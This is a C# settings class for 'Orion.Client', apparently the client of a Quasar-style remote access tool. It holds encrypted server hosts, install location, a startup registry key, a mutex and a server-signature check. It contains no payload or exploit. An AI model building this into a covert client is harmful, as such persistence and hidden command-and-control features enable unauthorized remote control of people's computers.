using Orion.Common.Cryptography;
using Orion.Common.Models;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;

namespace Orion.Client.Config
{
    /// <summary>
    /// Stores the configuration of the client.
    /// </summary>
    public static class Settings
    {
    // Version string reported to the server regardless of assembly metadata.
    private const string VersionOverride = "6.0.0";

#if DEBUG
        public static string VERSION = "6.0.0";
        public static string HOSTS = "127.0.0.1:4782;";
        public static int RECONNECTDELAY = 500;
        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
        public static string SUBDIRECTORY = "Test";
        public static string INSTALLNAME = "test.exe";
        public static bool INSTALL = false;
        public static bool STARTUP = false;
        public static string MUTEX = "123AKs82kA,ylAo2kAlUS2kYkala!";
        public static string STARTUPKEY = "Orion Client Startup";
        public static string ENCRYPTIONKEY = "";
        public static string TAG = "DEBUG";
        public static string SERVERSIGNATURE = "";
        public static string SERVERCERTIFICATESTR = "";
        public static X509Certificate2 SERVERCERTIFICATE;
        public static string INSTALLPATH = "";
        public static bool PASTEBIN = false;

        public static IntPtr OriginalDesktopPointer = IntPtr.Zero;

        public static bool Initialize()
        {
            SetupPaths();
            return true;
        }
#else
        public static string VERSION = "";
        public static string HOSTS = "";
        public static int RECONNECTDELAY = 5000;
        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
        public static string SUBDIRECTORY = "";
        public static string INSTALLNAME = "";
        public static bool INSTALL = false;
        public static bool STARTUP = false;
        public static string MUTEX = "";
        public static string STARTUPKEY = "";
        public static string ENCRYPTIONKEY = "";
        public static string TAG = "";
        public static string SERVERSIGNATURE = "";
        public static string SERVERCERTIFICATESTR = "";
        public static X509Certificate2 SERVERCERTIFICATE;
        public static string INSTALLPATH = "";
        public static bool PASTEBIN = false;

        public static IntPtr OriginalDesktopPointer = IntPtr.Zero;

        public static bool Initialize()
        {
            if (string.IsNullOrEmpty(VERSION)) return false;
            var aes = new Aes256(ENCRYPTIONKEY);
            TAG = aes.Decrypt(TAG);
            VERSION = aes.Decrypt(VERSION);
            HOSTS = aes.Decrypt(HOSTS);
            SUBDIRECTORY = aes.Decrypt(SUBDIRECTORY);
            INSTALLNAME = aes.Decrypt(INSTALLNAME);
            MUTEX = aes.Decrypt(MUTEX);
            STARTUPKEY = aes.Decrypt(STARTUPKEY);
            SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
            SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(aes.Decrypt(SERVERCERTIFICATESTR)));
            SetupPaths();
            return VerifyHash();
        }
#endif

    public static string ReportedVersion => string.IsNullOrWhiteSpace(VersionOverride) ? VERSION : VersionOverride;

        static void SetupPaths()
        {
            INSTALLPATH = Path.Combine(DIRECTORY, (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + @"\" : "") + INSTALLNAME);
        }

        static bool VerifyHash()
        {
            try
            {
                var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(ENCRYPTIONKEY));
                return RsaSha256.VerifyHash(SERVERCERTIFICATE, hash, Convert.FromBase64String(SERVERSIGNATURE));
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Settings.VerifyHash failed: {ex.Message}");
                return false;
            }
        }
    }
}
